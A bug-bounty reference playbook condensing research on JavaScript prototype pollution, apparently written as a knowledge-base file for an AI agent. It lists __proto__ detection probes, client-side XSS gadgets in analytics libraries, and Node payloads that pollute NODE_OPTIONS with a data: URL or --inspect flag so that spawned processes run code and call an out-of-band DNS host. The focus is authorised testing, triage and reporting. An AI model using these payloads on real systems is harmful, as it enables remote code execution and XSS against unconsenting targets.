# Prototype Pollution — Research Articles Compendium

> Consolidated from 3 PortSwigger Research articles (2022–2023, Gareth Heyes): client-side gadget research, black-box server-side detection without DoS, and filesystem-free Node RCE. Reference playbook for bug bounty testing/triage.

## Article Map

| Article | Year | Focus |
|---|---|---|
| widespread-prototype-pollution-gadgets | 2022 | CSPP gadget hunting: browser APIs + analytics libraries |
| server-side-prototype-pollution | 2023 | Black-box SSPP detection without DoS + automated probes |
| exploiting-prototype-pollution-in-node-without-the-filesystem | 2023 | NODE_OPTIONS `--import` data: URL → RCE, no local file |

## Key Techniques

**Server-side detection without DoS** — pollution persists for the Node process lifetime; destructive probes (`encoding`, `constructor`, `expect`, body overwrite) can kill or permanently break the app. Instead send `__proto__` parameter-pollution probes toggling benign options:
- `{"__proto__":{"json spaces":10}}` — reformats any JSON response (Express ≤4.17.3)
- `{"__proto__":{"exposedHeaders":["pp-probe"]}}` — CORS module reflects header
- `{"__proto__":{"status":510}}` — http-errors flips error status; resend invalid JSON and observe 510
- OPTIONS request: pollute `head` → method vanishes from `Allow`
- JSON reflection diff: `__proto__x` echoed but `__proto__` dropped ⇒ merge path; key persists across requests ⇒ stored pollution (Lodash reflection dedupe confirms)
- Immutable-prototype probe: `{}.__proto__.__proto__={}` throws, `="x"` is a no-op — differential proves chain traversal
- OAST: `{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"}}` → DNS callback; double-quote obfuscation evades scraper/WAF, works on all OS
- Engine fingerprinting: probe `toString`/`valueOf`/`constructor` reflections; Rhino leaks `toSource`/`__iterator__`

**Client-side gadget hunting (CSPP)** — exploit = source + gadget:
1. Find a source: URL params, JSON body, hash via `?__proto__[key]=val` / `constructor[prototype][key]=val` (DOM Invader automates canary detection).
2. Find a gadget: DOM Invader traces canary properties into sinks (eval, setTimeout, innerHTML, script.src, fetch options, Object.defineProperty descriptors, localStorage dot-getters).
3. Confirm real sink hit; refresh clears client pollution — tune per gadget (GTM `sequence` needs trailing `-`).

**Node exploitation WITHOUT filesystem** — when `--require` file payloads are unavailable:
- Node ≥19 `--import` flag allowed in NODE_OPTIONS: `"__proto__":{"NODE_OPTIONS":"--import=\"data:text/javascript,import dns from 'node:dns';dns.lookup('ID.oastify.com',x=>1)\""}`
- Any child_process spawn (`fork()`, `exec`, `spawn`) inherits polluted `NODE_OPTIONS`/`argv0`/`shell` → data: URL executes → RCE; `--inspect` devtools connection is also an RCE path.
- Template gadget chains (EJS): pollute `outputFunctionName`/`escapeFunction`/`client`/`escape` in render options → SSTI → RCE.

## Gadget Table

| Gadget | Library/Context | Trigger | Impact |
|---|---|---|---|
| hitCallback | Google Analytics | setTimeout sink | DOM XSS |
| sequence | Google Tag Manager | eval sink (+ trailing `-`) | DOM XSS |
| event_callback | Google Tag Manager | setTimeout sink | DOM XSS |
| cspNonce | Adobe DTM | innerHTML sink | XSS |
| bodyHiddenStyle | Adobe DTM | innerHTML sink | XSS |
| trackingServerSecure | Adobe DTM | script.src host control | DOM XSS |
| body/headers/mode | fetch() options | object arg missing own props | request manipulation |
| value/configurable | Object.defineProperty | descriptor pollution | override non-writable props |
| NODE_OPTIONS/argv0/shell | child_process fork/spawn | process spawn | RCE via data: URL |
| outputFunctionName | EJS | template render | SSTI → RCE |
| status | http-errors | error path | detection / response control |
| json spaces | Express | res.json | detection |
| exposedHeaders | cors | CORS responses | detection |
| charset | body-parser | content-type parse | UTF-7 XSS / detection |
| foo (dot-access) | localStorage/sessionStorage | getter without get() | storage value control |

## By-Design / SKIP Filters

- Pollution possible but NO gadget chain ⇒ LOW/INFO only — "I can set properties" is not impact.
- Self-XSS-only gadget or gadget gated behind own account ⇒ LOW.
- Reflection-only confirmation without behavior change ⇒ verify with a second safe probe before reporting.
- RCE claims without demonstrated gadget ⇒ downgrade.
- Known-fixed targets (Express >4.17.3 json spaces) ⇒ INFO at best.

## Severity Guide

- SSPP + gadget → RCE (fork/spawn NODE_OPTIONS, EJS, Kibana/Blitz-style): HIGH/CRITICAL
- CSPP + gadget → DOM XSS (hitCallback/sequence/cspNonce): MEDIUM (HIGH if token theft/auth state)
- SSPP + config/behavior control only (headers, status, charset): LOW–MEDIUM
- Pollution, no gadget: INFO
- Suspected but blocked/unproven chain: INFORMATIONAL

## Reporting Checklist

- [ ] Prove source: minimal safe `__proto__` probe + differential response captured
- [ ] Prove persistence/inheritance: pollution holds on later requests (server) or fresh object reads (client)
- [ ] Identify gadget: exact library/version + sink (code ref or DOM Invader trace)
- [ ] Demonstrate impact: DNS collaborator for RCE, alert/print for client XSS — zero DoS
- [ ] No destructive probes used (no `encoding`, `constructor`, `expect`, no persistent XSS overwrite)
- [ ] Record versions + mitigations (Map/Set, --disable-proto=delete, Object.create(null))
- [ ] Severity per guide; blocked chain ⇒ INFORMATIONAL with repro steps

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
